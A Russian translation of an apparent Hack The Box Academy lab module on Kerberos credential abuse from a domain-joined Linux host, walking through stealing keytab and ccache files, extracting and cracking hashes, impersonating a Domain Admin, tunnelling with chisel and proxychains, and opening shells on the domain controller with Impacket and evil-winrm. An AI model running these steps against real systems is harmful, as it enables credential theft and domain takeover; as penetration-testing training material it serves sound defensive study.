## Керберос в Linux

Windows и Linux используют один и тот же процесс для запроса билета на предоставление билетов (TGT) и билета на обслуживание (TGS). Однако то, как они хранят информацию о билетах, может различаться в зависимости от дистрибутива и реализации Linux.

В большинстве случаев машины Linux хранят билеты Kerberos в виде [файлов ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) в `/tmp`каталог. По умолчанию расположение билета Kerberos хранится в переменной среды. `KRB5CCNAME`. Эта переменная может определить, используются ли билеты Kerberos или изменено расположение по умолчанию для хранения билетов Kerberos. Эти [файлы ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) защищены разрешениями на чтение и запись, но пользователь с повышенными привилегиями или привилегиями root может легко получить доступ к этим билетам.

Другое повседневное использование Kerberos в Linux — это [файлы keytab](https://kb.iu.edu/d/aumh) . Keytab [.](https://kb.iu.edu/d/aumh) — это файл, содержащий пары участников Kerberos и зашифрованных ключей (которые получены из пароля Kerberos) Вы можете использовать файл keytab для аутентификации в различных удаленных системах с помощью Kerberos без ввода пароля. Однако, когда вы меняете свой пароль, вы должны воссоздать все свои файлы keytab.

[Файлы Keytab](https://kb.iu.edu/d/aumh) обычно позволяют сценариям автоматически аутентифицироваться с использованием Kerberos, не требуя вмешательства человека или доступа к паролю, хранящемуся в текстовом файле. Например, сценарий может использовать файл keytab для доступа к файлам, хранящимся в общей папке Windows.

**Примечание.** Любой компьютер, на котором установлен клиент Kerberos, может создавать файлы keytab. Файлы Keytab можно создавать на одном компьютере и копировать для использования на других компьютерах, поскольку они не ограничены системами, в которых они были изначально созданы.

---

## Сценарий

Чтобы попрактиковаться и понять, как мы можем злоупотреблять Kerberos из системы Linux, у нас есть компьютер ( `LINUX01`), подключенный к контроллеру домена. Эта машина доступна только через `MS01`. Чтобы получить доступ к этой машине через SSH, мы можем подключиться к `MS01`через RDP и оттуда подключиться к машине Linux с помощью SSH из командной строки Windows. Другой вариант — использовать переадресацию портов. Если вы не знаете, как это сделать, вы можете прочитать модуль [Pivoting, Tunneling, and Port Forwarding](https://academy.hackthebox.com/module/details/158) .

#### Аутентификация Linux из образа MS01

![текст](https://academy.hackthebox.com/storage/modules/147/linux-auth-from-ms01.jpg)

В качестве альтернативы мы создали портфорвард, чтобы упростить взаимодействие с `LINUX01`. Подключившись к порту TCP/2222 на `MS01`, мы получим доступ к порту TCP/22 на `LINUX01`.

Предположим, мы находимся в новой оценке, и компания предоставляет нам доступ к `LINUX01`и пользователь `david@inlanefreight.htb`и пароль `Password2`.

#### Аутентификация Linux через переадресацию портов

Аутентификация Linux через переадресацию портов

```shell-session
lizergindoma@htb[/htb]$ ssh david@inlanefreight.htb@10.129.204.23 -p 2222

david@inlanefreight.htb@10.129.204.23's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 11 Oct 2022 09:30:58 AM UTC

  System load:  0.09               Processes:               227
  Usage of /:   38.1% of 13.70GB   Users logged in:         2
  Memory usage: 32%                IPv4 address for ens160: 172.16.1.15
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

12 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

New release '22.04.1 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


Last login: Tue Oct 11 09:30:46 2022 from 172.16.1.5
david@inlanefreight.htb@linux01:~$ 
```

---

## Определение интеграции Linux и Active Directory

Мы можем определить, является ли машина Linux присоединенной к домену, используя [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd) , инструмент, используемый для управления регистрацией системы в домене, и установить, каким пользователям или группам домена разрешен доступ к локальным системным ресурсам.

#### realm — проверьте, присоединен ли Linux-компьютер к домену

realm — проверьте, присоединен ли Linux-компьютер к домену

```shell-session
david@inlanefreight.htb@linux01:~$ realm list

inlanefreight.htb
  type: kerberos
  realm-name: INLANEFREIGHT.HTB
  domain-name: inlanefreight.htb
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  required-package: sssd
  required-package: libnss-sss
  required-package: libpam-sss
  required-package: adcli
  required-package: samba-common-bin
  login-formats: %U@inlanefreight.htb
  login-policy: allow-permitted-logins
  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
  permitted-groups: Linux Admins
```

Выходные данные команды показывают, что машина настроена как член Kerberos. Это также дает нам информацию о доменном имени (inlanefreight.htb) и о том, каким пользователям и группам разрешено входить в систему, в данном случае это пользователи Дэвид и Хулио и группа Linux Admins.

Если [область](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd) недоступна, мы также можем поискать другие инструменты, используемые для интеграции Linux с Active Directory, такие как [sssd](https://sssd.io/) или [winbind](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html) . Поиск этих служб, работающих на машине, — это еще один способ определить, присоединена ли она к домену. Мы можем прочитать этот [пост в блоге](https://www.2daygeek.com/how-to-identify-that-the-linux-server-is-integrated-with-active-directory-ad/) для более подробной информации. Давайте найдем эти службы, чтобы убедиться, что машина присоединена к домену.

#### PS - проверьте, присоединен ли компьютер Linux к домену

PS - проверьте, присоединен ли компьютер Linux к домену

```shell-session
david@inlanefreight.htb@linux01:~$ ps -ef | grep -i "winbind\|sssd"

root        2140       1  0 Sep29 ?        00:00:01 /usr/sbin/sssd -i --logger=files
root        2141    2140  0 Sep29 ?        00:00:08 /usr/libexec/sssd/sssd_be --domain inlanefreight.htb --uid 0 --gid 0 --logger=files
root        2142    2140  0 Sep29 ?        00:00:03 /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --logger=files
root        2143    2140  0 Sep29 ?        00:00:03 /usr/libexec/sssd/sssd_pam --uid 0 --gid 0 --logger=files
```

---

## Поиск билетов Kerberos в Linux

Как злоумышленник, мы всегда ищем учетные данные. На компьютерах, присоединенных к домену Linux, мы хотим найти билеты Kerberos, чтобы получить больше доступа. Билеты Kerberos можно найти в разных местах в зависимости от реализации Linux или изменения настроек по умолчанию администратором. Давайте рассмотрим некоторые распространенные способы поиска билетов Kerberos.

---

## Поиск файлов Keytab

Прямой подход заключается в использовании `find`для поиска файлов, имя которых содержит слово `keytab`. Когда администратор обычно создает билет Kerberos для использования со сценарием, он устанавливает расширение `.keytab`. Хотя это и не обязательно, это способ, которым администраторы обычно обращаются к файлу keytab.

#### Использование Find для поиска файлов с Keytab в имени

Использование Find для поиска файлов с Keytab в имени

```shell-session
david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null

<SNIP>

   131610      4 -rw-------   1 root     root         1348 Oct  4 16:26 /etc/krb5.keytab
   262169      4 -rw-rw-rw-   1 root     root          216 Oct 12 15:13 /opt/specialfiles/carlos.keytab
```

**Примечание.** Чтобы использовать файл keytab, у нас должны быть права на чтение и запись (rw) в файле.

Другой способ найти `keytab`файлы находятся в автоматизированных сценариях, настроенных с помощью cronjob или любой другой службы Linux. Если администратору необходимо запустить сценарий для взаимодействия со службой Windows, использующей Kerberos, и если в файле keytab нет `.keytab`расширение, мы можем найти подходящее имя файла в скрипте. Давайте посмотрим на этот пример:

#### Идентификация файлов Keytab в Cronjobs

Идентификация файлов Keytab в Cronjobs

```shell-session
carlos@inlanefreight.htb@linux01:~$ crontab -l

# Edit this file to introduce tasks to be run by cron.
# 
<SNIP>
# 
# m h  dom mon dow   command
*5/ * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
#!/bin/bash

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
```

В приведенном выше сценарии мы замечаем использование [kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html) , что означает, что используется Kerberos. [kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html) позволяет взаимодействовать с Kerberos, и его функция заключается в запросе TGT пользователя и сохранении этого билета в кеше (файл ccache). Мы можем использовать `kinit`импортировать `keytab`в нашу сессию и действовать как пользователь.

В этом примере мы нашли скрипт, импортирующий билет Kerberos ( `svc_workstations.kt`) для пользователя `svc_workstations@INLANEFREIGHT.HTB`прежде чем пытаться подключиться к общей папке. Позже мы обсудим, как использовать эти билеты и олицетворять пользователей.

**Примечание.** Как мы обсуждали в разделе «Передача билета из Windows», учетной записи компьютера требуется билет для взаимодействия со средой Active Directory. Точно так же для машины, присоединенной к домену Linux, требуется билет. Билет представлен в виде keytab-файла, расположенного по умолчанию по адресу `/etc/krb5.keytab`и может быть прочитан только пользователем root. Если мы получим доступ к этому билету, мы сможем выдать себя за учетную запись компьютера LINUX01$.INLANEFREIGHT.HTB.

---

## Поиск файлов ccache

Кэш учетных данных или [файл ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) хранит учетные данные Kerberos, пока они остаются действительными и, как правило, пока длится сеанс пользователя. Как только пользователь проходит аутентификацию в домене, создается файл ccache, в котором хранится информация о билете. Путь к этому файлу находится в `KRB5CCNAME`переменная окружения. Эта переменная используется инструментами, поддерживающими аутентификацию Kerberos, для поиска данных Kerberos. Давайте найдем переменные среды и определим расположение нашего кэша учетных данных Kerberos:

#### Просмотр переменных среды для файлов ccache.

Просмотр переменных среды для файлов ccache.

```shell-session
david@inlanefreight.htb@linux01:~$ env | grep -i krb5

KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
```

Как упоминалось ранее, `ccache`файлы расположены по умолчанию в `/tmp`. Мы можем искать пользователей, которые вошли в систему на компьютере, и если мы получим доступ как root или привилегированный пользователь, мы сможем выдавать себя за пользователя, используя его `ccache`файл, пока он еще действителен.

#### Поиск файлов ccache в /tmp

Поиск файлов ccache в /tmp

```shell-session
david@inlanefreight.htb@linux01:~$ ls -la /tmp

total 68
drwxrwxrwt 13 root                     root                           4096 Oct  6 16:38 .
drwxr-xr-x 20 root                     root                           4096 Oct  6  2021 ..
-rw-------  1 julio@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  6 16:38 krb5cc_647401106_tBswau
-rw-------  1 david@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  6 15:23 krb5cc_647401107_Gf415d
-rw-------  1 carlos@inlanefreight.htb domain users@inlanefreight.htb 1433 Oct  6 15:43 krb5cc_647402606_qd2Pfh
```

---

## Злоупотребление файлами KeyTab

Как злоумышленники, у нас может быть несколько вариантов использования файла keytab. Первое, что мы можем сделать, это выдать себя за пользователя, используя `kinit`. Чтобы использовать файл keytab, нам нужно знать, для какого пользователя он был создан. `klist`— еще одно приложение, используемое для взаимодействия с Kerberos в Linux. Это приложение считывает информацию с `keytab`файл. Давайте посмотрим, что с помощью следующей команды:

#### Список информации о файле keytab

Список информации о файле keytab

```shell-session
david@inlanefreight.htb@linux01:~$ klist -k -t 

/opt/specialfiles/carlos.keytab 
Keytab name: FILE:/opt/specialfiles/carlos.keytab
KVNO Timestamp           Principal
---- ------------------- ------------------------------------------------------
   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB
```

Билет соответствует пользователю Carlos. Теперь мы можем олицетворять пользователя с помощью `kinit`. Давайте подтвердим, какой билет мы используем с `klist`а затем импортировать билет Карлоса в нашу сессию с помощью `kinit`.

**Примечание:** **kinit** чувствителен к регистру, поэтому обязательно используйте имя принципала, как показано в klist. В этом случае имя пользователя пишется строчными буквами, а доменное имя — прописными.

#### Выдача себя за пользователя с помощью keytab

Выдача себя за пользователя с помощью keytab

```shell-session
david@inlanefreight.htb@linux01:~$ klist 

Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: david@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:02:11  10/07/22 03:02:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:02:11
david@inlanefreight.htb@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
david@inlanefreight.htb@linux01:~$ klist 
Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: carlos@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:16:11
```

Мы можем попытаться получить доступ к общей папке `\\dc01\carlos`для подтверждения нашего доступа.

#### Подключение к SMB Share от имени Carlos

Подключение к SMB Share от имени Carlos

```shell-session
david@inlanefreight.htb@linux01:~$ smbclient //dc01/carlos -k -c ls

  .                                   D        0  Thu Oct  6 14:46:26 2022
  ..                                  D        0  Thu Oct  6 14:46:26 2022
  carlos.txt                          A       15  Thu Oct  6 14:46:54 2022

                7706623 blocks of size 4096. 4452852 blocks available
```

**Примечание.** Чтобы сохранить билет из текущего сеанса, перед импортом таблицы ключей сохраните копию файла ccache, присутствующего в переменной среды. `KRB5CCNAME`.

### Извлечение Keytab

Второй метод, который мы будем использовать для злоупотребления Kerberos в Linux, — это извлечение секретов из файла keytab. Мы смогли выдать себя за Карлоса, используя билеты учетной записи, чтобы прочитать общую папку в домене, но если мы хотим получить доступ к его учетной записи на компьютере с Linux, нам понадобится его пароль.

Мы можем попытаться взломать пароль учетной записи, извлекая хэши из файла keytab. Давайте воспользуемся [KeyTabExtract](https://github.com/sosdave/KeyTabExtract) , инструментом для извлечения ценной информации из файлов .keytab типа 502, которая может использоваться для аутентификации компьютеров Linux в Kerberos. Сценарий извлечет такую ​​информацию, как область, субъект-служба, тип шифрования и хэши.

#### Извлечение хэшей Keytab с помощью KeyTabExtract

Извлечение хэшей Keytab с помощью KeyTabExtract

```shell-session
david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 

[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : carlos/
        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```

С помощью хэша NTLM мы можем выполнить атаку Pass the Hash. С помощью хеша AES256 или AES128 мы можем подделать наши билеты с помощью Rubeus или попытаться взломать хэши, чтобы получить пароль в виде открытого текста.

**Примечание.** Файл пароля может содержать различные типы хэшей и может быть объединен, чтобы содержать несколько учетных данных даже от разных пользователей.

Самый простой хэш для взлома — это хеш NTLM. Мы можем использовать такие инструменты, как [Hashcat](https://hashcat.net/) или [John the Ripper,](https://www.openwall.com/john/) чтобы взломать его. Тем не менее, быстрый способ расшифровки паролей — онлайн-репозитории, такие как [https://crackstation.net/](https://crackstation.net/) , которые содержат миллиарды паролей.

![текст](https://academy.hackthebox.com/storage/modules/147/crackstation.jpg)

Как мы видим на изображении, пароль для пользователя Carlos `Password5`. Теперь мы можем войти как Карлос.

#### Войти как Карлос

Войти как Карлос

```shell-session
david@inlanefreight.htb@linux01:~$ su - carlos@inlanefreight.htb

Password: 
carlos@inlanefreight.htb@linux01:~$ klist 
Ticket cache: FILE:/tmp/krb5cc_647402606_ZX6KFA
Default principal: carlos@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 11:01:13  10/07/2022 21:01:13  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/08/2022 11:01:13
```

### Получение большего количества хэшей

У Карлоса есть cronjob, который использует файл keytab с именем `svc_workstations.kt`. Мы можем повторить процесс, взломать пароль и войти как `svc_workstations`.

---

## Злоупотребление Keytab ccache

Чтобы злоупотребить файлом ccache, все, что нам нужно, это права на чтение файла. Эти файлы, расположенные в `/tmp`, могут быть прочитаны только создавшим их пользователем, но если мы получим root-доступ, мы сможем их использовать.

Как только мы войдем в систему с учетными данными для пользователя `svc_workstations`, мы можем использовать `sudo -l`и подтвердите, что пользователь может выполнять любую команду как root. Мы можем использовать `sudo su`Команда для смены пользователя на root.

#### Повышение привилегий до root

Повышение привилегий до root

```shell-session
lizergindoma@htb[/htb]$ ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222
                  
svc_workstations@inlanefreight.htb@10.129.204.23's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)          
...SNIP...

svc_workstations@inlanefreight.htb@linux01:~$ sudo -l
[sudo] password for svc_workstations@inlanefreight.htb: 
Matching Defaults entries for svc_workstations@inlanefreight.htb on linux01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User svc_workstations@inlanefreight.htb may run the following commands on linux01:
    (ALL) ALL
svc_workstations@inlanefreight.htb@linux01:~$ sudo su
root@linux01:/home/svc_workstations@inlanefreight.htb# whoami
root
```

Как root, нам нужно определить, какие билеты присутствуют на машине, кому они принадлежат и срок их действия.

#### Ищем файлы ccache

Ищем файлы ccache

```shell-session
root@linux01:~# ls -la /tmp

total 76
drwxrwxrwt 13 root                               root                           4096 Oct  7 11:35 .
drwxr-xr-x 20 root                               root                           4096 Oct  6  2021 ..
-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct  7 11:35 krb5cc_647401106_HRJDux
-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct  7 11:35 krb5cc_647401106_qMKxc6
-rw-------  1 david@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct  7 10:43 krb5cc_647401107_O0oUWh
-rw-------  1 svc_workstations@inlanefreight.htb domain users@inlanefreight.htb 1535 Oct  7 11:21 krb5cc_647401109_D7gVZF
-rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 3175 Oct  7 11:35 krb5cc_647402606
-rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 1433 Oct  7 11:01 krb5cc_647402606_ZX6KFA
```

Есть один пользователь ( julio@inlanefreight.htb ), к которому мы еще не получили доступ. Мы можем подтвердить группы, к которым он принадлежит, используя `id`.

#### Идентификация членства в группе с помощью команды id

Идентификация членства в группе с помощью команды id

```shell-session
root@linux01:~# id julio@inlanefreight.htb

uid=647401106(julio@inlanefreight.htb) gid=647400513(domain users@inlanefreight.htb) groups=647400513(domain users@inlanefreight.htb),647400512(domain admins@inlanefreight.htb),647400572(denied rodc password replication group@inlanefreight.htb)
```

Хулио является членом `Domain Admins`группа. Мы можем попытаться выдать себя за пользователя и получить доступ к `DC01`Хост контроллера домена.

Чтобы использовать файл ccache, мы можем скопировать файл ccache и назначить путь к файлу `KRB5CCNAME`переменная.

#### Импорт файла ccache в нашу текущую сессию

Импорт файла ccache в нашу текущую сессию

```shell-session
root@linux01:~# klist

klist: No credentials cache found (filename: /tmp/krb5cc_0)
root@linux01:~# cp /tmp/krb5cc_647401106_I8I133 .
root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_I8I133
root@linux01:~# klist
Ticket cache: FILE:/root/krb5cc_647401106_I8I133
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/08/2022 13:25:01
root@linux01:~# smbclient //dc01/C$ -k -c ls -no-pass
  $Recycle.Bin                      DHS        0  Wed Oct  6 17:31:14 2021
  Config.Msi                        DHS        0  Wed Oct  6 14:26:27 2021
  Documents and Settings          DHSrn        0  Wed Oct  6 20:38:04 2021
  john                                D        0  Mon Jul 18 13:19:50 2022
  julio                               D        0  Mon Jul 18 13:54:02 2022
  pagefile.sys                      AHS 738197504  Thu Oct  6 21:32:44 2022
  PerfLogs                            D        0  Fri Feb 25 16:20:48 2022
  Program Files                      DR        0  Wed Oct  6 20:50:50 2021
  Program Files (x86)                 D        0  Mon Jul 18 16:00:35 2022
  ProgramData                       DHn        0  Fri Aug 19 12:18:42 2022
  SharedFolder                        D        0  Thu Oct  6 14:46:20 2022
  System Volume Information         DHS        0  Wed Jul 13 19:01:52 2022
  tools                               D        0  Thu Sep 22 18:19:04 2022
  Users                              DR        0  Thu Oct  6 11:46:05 2022
  Windows                             D        0  Wed Oct  5 13:20:00 2022

                7706623 blocks of size 4096. 4447612 blocks available
```

**Примечание:** klist отображает информацию о билете. Мы должны учитывать значения «действительное начало» и «истекает». Если срок действия истек, билет не будет работать. `ccache files`являются временными. Они могут измениться или истечь, если пользователь больше не использует их или во время операций входа и выхода.

---

## Использование инструментов атаки Linux с Kerberos

Большинство средств атаки Linux, которые взаимодействуют с Windows и Active Directory, поддерживают аутентификацию Kerberos. Если мы используем их с компьютера, присоединенного к домену, нам необходимо убедиться, что `KRB5CCNAME`переменная окружения установлена ​​на файл ccache, который мы хотим использовать. В случае, если мы атакуем с машины, которая не является членом домена, например, с нашего хоста атаки, нам нужно убедиться, что наша машина может связаться с KDC или контроллером домена, и что разрешение доменного имени работает.

В этом сценарии наш атакующий хост не имеет подключения к `KDC/Domain Controller`, и мы не можем использовать контроллер домена для разрешения имен. Чтобы использовать Kerberos, нам нужно проксировать наш трафик через `MS01`с помощью таких инструментов, как [Chisel](https://github.com/jpillora/chisel) и [Proxychains](https://github.com/haad/proxychains) , и отредактируйте `/etc/hosts`файл для жесткого кода IP-адресов домена и машин, которые мы хотим атаковать.

#### Хост-файл изменен

Хост-файл изменен

```shell-session
lizergindoma@htb[/htb]$ cat /etc/hosts

# Host addresses

172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
172.16.1.5  ms01.inlanefreight.htb  ms01
```

Нам нужно изменить наш файл конфигурации proxychains, чтобы использовать socks5 и порт 1080.

#### Файл конфигурации проксичейнов

Файл конфигурации проксичейнов

```shell-session
lizergindoma@htb[/htb]$ cat /etc/proxychains.conf

<SNIP>

[ProxyList]
socks5 127.0.0.1 1080
```

Мы должны загрузить и запустить [chisel](https://github.com/jpillora/chisel) на нашем хосте атаки.

#### Загрузите Chisel на наш хост атаки

Загрузите Chisel на наш хост атаки

```shell-session
lizergindoma@htb[/htb]$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
lizergindoma@htb[/htb]$ gzip -d chisel_1.7.7_linux_amd64.gz
lizergindoma@htb[/htb]$ mv chisel_* chisel && chmod +x ./chisel
lizergindoma@htb[/htb]$ sudo ./chisel server --reverse 

2022/10/10 07:26:15 server: Reverse tunneling enabled
2022/10/10 07:26:15 server: Fingerprint 58EulHjQXAOsBRpxk232323sdLHd0r3r2nrdVYoYeVM=
2022/10/10 07:26:15 server: Listening on http://0.0.0.0:8080
```

Подключиться к `MS01`через RDP и запустите chisel (находится в C:\Tools).

#### Подключитесь к MS01 с помощью xfreerdp

Подключитесь к MS01 с помощью xfreerdp

```shell-session
lizergindoma@htb[/htb]$ xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
```

#### Выполнить стамеску от MS01

Выполнить стамеску от MS01

```cmd-session
C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks

2022/10/10 06:34:19 client: Connecting to ws://10.10.14.33:8080
2022/10/10 06:34:20 client: Connected (Latency 125.6177ms)
```

**Примечание.** IP-адрес клиента — это IP-адрес хоста атаки.

Наконец, нам нужно перенести файл ccache Хулио из `LINUX01`и создайте переменную окружения `KRB5CCNAME`со значением, соответствующим пути файла ccache.

#### Установка переменной среды KRB5CCNAME

Установка переменной среды KRB5CCNAME

```shell-session
lizergindoma@htb[/htb]$ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```

**Примечание.** Если вы не знакомы с операциями передачи файлов, ознакомьтесь с модулем [File Transfers](https://academy.hackthebox.com/module/details/24) .

### Удар

Чтобы использовать билет Kerberos, нам нужно указать имя нашей целевой машины (не IP-адрес) и использовать опцию `-k`. Если мы получим запрос на ввод пароля, мы также можем включить опцию `-no-pass`.

#### Использование Impacket с прокси-цепями и аутентификацией Kerberos

Использование Impacket с прокси-цепями и аутентификацией Kerberos

```shell-session
lizergindoma@htb[/htb]$ proxychains impacket-wmiexec ms01 -k

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  ms01:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
[*] SMBv3.0 dialect used
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  ms01:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  MS01:50713  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
inlanefreight\julio
```

**Примечание.** Если вы используете инструменты Impacket с компьютера Linux, подключенного к домену, обратите внимание, что некоторые реализации Linux Active Directory используют префикс FILE: в переменной KRB5CCNAME. Если это так, нам нужно изменить переменную только для включения пути к файлу ccache.

### Зло-Winrm

Чтобы использовать [evil-winrm](https://github.com/Hackplayers/evil-winrm) с Kerberos, нам нужно установить пакет Kerberos, используемый для сетевой аутентификации. Для некоторых Linux, таких как Debian (Parrot, Kali и т. д.), это называется `krb5-user`. Во время установки мы получим приглашение для области Kerberos. Используйте доменное имя: `INLANEFREIGHT.HTB`, а KDC - это `DC01`.

#### Установка пакета проверки подлинности Kerberos

Установка пакета проверки подлинности Kerberos

```shell-session
lizergindoma@htb[/htb]$ sudo apt-get install krb5-user -y

Reading package lists... Done                                                                                                  
Building dependency tree... Done    
Reading state information... Done

<SNIP>
```

#### Область Kerberos версии 5 по умолчанию

![текст](https://academy.hackthebox.com/storage/modules/147/kerberos-realm.jpg)

Серверы Kerberos могут быть пустыми.

#### Административный сервер для вашей области Kerberos

![текст](https://academy.hackthebox.com/storage/modules/147/kerberos-server-dc01.jpg)

В случае, если пакет `krb5-user`уже установлен, нам нужно изменить файл конфигурации `/etc/krb5.conf`включить следующие значения:

#### Файл конфигурации Kerberos для INLANEFREIGHT.HTB

Файл конфигурации Kerberos для INLANEFREIGHT.HTB

```shell-session
lizergindoma@htb[/htb]$ cat /etc/krb5.conf

[libdefaults]
        default_realm = INLANEFREIGHT.HTB

<SNIP>

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }

<SNIP>
```

Теперь мы можем использовать evil-winrm.

#### Использование Evil-WinRM с Kerberos

Использование Evil-WinRM с Kerberos

```shell-session
lizergindoma@htb[/htb]$ proxychains evil-winrm -i dc01 -r inlanefreight.htb

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14

Evil-WinRM shell v3.3

Warning: Remote path completions are disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:5985  ...  OK
*Evil-WinRM* PS C:\Users\julio\Documents> whoami ; hostname
inlanefreight\julio
DC01
```

---

## Разнообразный

Если мы хотим использовать `ccache file`в Windows или `kirbi file`на машине с Linux мы можем использовать [impacket-ticketConverter](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py) для их преобразования. Чтобы использовать его, мы указываем файл, который мы хотим преобразовать, и имя выходного файла. Давайте конвертируем файл ccache Хулио в kirbi.

#### Конвертер билетов Impacket

Конвертер билетов Impacket

```shell-session
lizergindoma@htb[/htb]$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] converting ccache to kirbi...
[+] done
```

Мы можем сделать обратную операцию, сначала выбрав `.kirbi file`. Давайте использовать `.kirbi`файл в винде.

#### Импорт преобразованного билета в сеанс Windows с помощью Rubeus

Импорт преобразованного билета в сеанс Windows с помощью Rubeus

```cmd-session
C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: Import Ticket
[+] Ticket successfully imported!
C:\htb> klist

Current LogonId is 0:0x31adf02

Cached Tickets: (1)

#0>     Client: julio @ INLANEFREIGHT.HTB
        Server: krbtgt/INLANEFREIGHT.HTB @ INLANEFREIGHT.HTB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0xa1c20000 -> reserved forwarded invalid renewable initial 0x20000
